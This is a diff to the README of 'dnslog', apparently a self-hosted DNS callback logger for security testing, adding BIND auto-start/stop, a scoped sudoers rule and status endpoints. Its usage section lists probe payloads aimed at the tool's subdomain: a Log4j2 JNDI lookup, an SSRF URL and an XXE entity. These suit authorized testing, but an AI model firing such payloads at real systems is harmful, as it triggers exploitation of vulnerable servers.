@@ -19,6 +19,7 @@ Target --DNS query--> Recursive NS --> Authoritative NS (BIND)
 - **BIND** handles authoritative DNS resolution for `*.log.yourdomain.com`
 - **dnslog.py** tails BIND query log, extracts matching records into SQLite
 - **Web UI** displays records in real-time via WebSocket push
+- **BIND auto-control**: automatically starts/stops BIND to minimize public exposure
 
 ## Requirements
 
@@ -113,6 +114,7 @@ Edit `dnslog.conf`:
 domain = log.example.com
 server_ip = 0.0.0.0
 named_log = /var/log/named/query.log
+named_idle_timeout = 600
 
 [web]
 port = 9090
@@ -129,13 +131,23 @@ max_records = 5000
 | `domain` | Your DNS log subdomain | `log.example.com` |
 | `server_ip` | Server IP (for reference) | `0.0.0.0` |
 | `named_log` | BIND query log path | `/var/log/named/query.log` |
+| `named_idle_timeout` | Auto-stop BIND after idle (seconds, 0=disabled) | `0` |
 | `port` | Web UI port | `9090` |
 | `ws_port` | WebSocket port | `9091` |
 | `access_code` | Access code for the platform | (empty, disabled) |
 | `path` | SQLite database filename | `dnslog.db` |
 | `max_records` | Max records to keep (0 = unlimited) | `5000` |
 
-### 5. Run
+### 5. Configure sudoers (for BIND auto-control)
+
+When `named_idle_timeout > 0`, the dnslog process user needs passwordless sudo to control BIND:
+
+```bash
+echo "ubuntu ALL=(ALL) NOPASSWD: /bin/systemctl start named, /bin/systemctl stop named, /bin/systemctl is-active named" | sudo tee /etc/sudoers.d/named-dnslog
+sudo chmod 440 /etc/sudoers.d/named-dnslog
+```
+
+### 6. Run
 
 ```bash
 python3 dnslog.py
@@ -173,17 +185,23 @@ sudo systemctl start dnslog
 1. Open `http://YOUR_SERVER:9090` in your browser
 2. Enter the access code configured in `dnslog.conf`
 3. Click **Get Token** to generate a unique subdomain (e.g., `abc12345.log.example.com`)
+   - BIND is automatically started when a token is generated
 4. Use this domain in your payload:
    - Log4j2 JNDI: `${jndi:ldap://abc12345.log.example.com/x}`
    - SSRF: `http://abc12345.log.example.com`
    - XXE: `<!ENTITY xxe SYSTEM "http://abc12345.log.example.com">`
 5. Records appear in real-time via WebSocket
+6. BIND auto-stops after the configured idle timeout (default 10 minutes)
+7. You can also manually start/stop BIND via the **DNS toggle button** in the status bar
 
 ## Features
 
 - **Token-based tracking**: Each token generates a unique subdomain; queries are grouped by token
 - **Real-time updates**: WebSocket push, no polling
 - **Access code protection**: Entire platform requires access code to use
+- **BIND auto-control**: BIND starts on demand, auto-stops after idle timeout, minimizes public DNS exposure
+- **Manual DNS toggle**: Start/Stop BIND with one click from the UI
+- **DNS status indicator**: Real-time status with countdown timer in the status bar
 - **Auto-cleanup**: Oldest records are pruned when exceeding `max_records`
 - **Deduplication**: Same domain + source IP combination is recorded only once
 - **localStorage persistence**: Token and access code survive page refresh
@@ -199,6 +217,9 @@ All API endpoints (except `/api/auth`) require access code authentication via:
 | Method | Endpoint | Description |
 |--------|----------|-------------|
 | `POST` | `/api/auth` | Verify access code. Body: `{"code": "xxx"}` |
+| `GET` | `/api/status?code=xxx` | Get BIND status, remaining time, timeout config |
+| `POST` | `/api/named/start?code=xxx` | Manually start BIND |
+| `POST` | `/api/named/stop?code=xxx` | Manually stop BIND |
 | `GET` | `/api/random?code=xxx` | Generate a random token domain |
 | `GET` | `/api/records?token=xxx&code=xxx` | Get records for a token (max 200) |
 | `DELETE` | `/api/records?token=xxx&code=xxx` | Clear records for a token |
@@ -206,11 +227,20 @@ All API endpoints (except `/api/auth`) require access code authentication via:
 
 **Quick examples:**
 ```bash
-# Generate a token domain
+# Generate a token domain (also starts BIND)
 curl "http://YOUR_SERVER:9090/api/random?code=your_access_code"
 
 # Fetch records
 curl "http://YOUR_SERVER:9090/api/records?token=abc12345&code=your_access_code"
+
+# Check DNS status
+curl "http://YOUR_SERVER:9090/api/status?code=your_access_code"
+
+# Manually start BIND
+curl -X POST "http://YOUR_SERVER:9090/api/named/start?code=your_access_code"
+
+# Manually stop BIND
+curl -X POST "http://YOUR_SERVER:9090/api/named/stop?code=your_access_code"
 
 # Clear records
 curl -X DELETE "http://YOUR_SERVER:9090/api/records?token=abc12345&code=your_access_code"
@@ -220,7 +250,7 @@ curl -X DELETE "http://YOUR_SERVER:9090/api/records?token=abc12345&code=your_acc
 
 ```
 dnslog/
-├── dnslog.py              # Main application (DNS tail + Flask + WebSocket)
+├── dnslog.py              # Main application (DNS tail + Flask + WebSocket + BIND control)
 ├── dnslog.conf.example    # Configuration template
 ├── dnslog.conf            # Your config (gitignored)
 ├── requirements.txt       # Python dependencies
@@ -236,3 +266,4 @@ dnslog/
 - The access code is stored in plaintext in `dnslog.conf` — protect file permissions
 - BIND query log must be readable by the dnslog process user
 - Consider placing the web UI behind a reverse proxy (nginx) with HTTPS in production
+- The sudoers rule is scoped to only BIND systemctl commands — minimize privilege
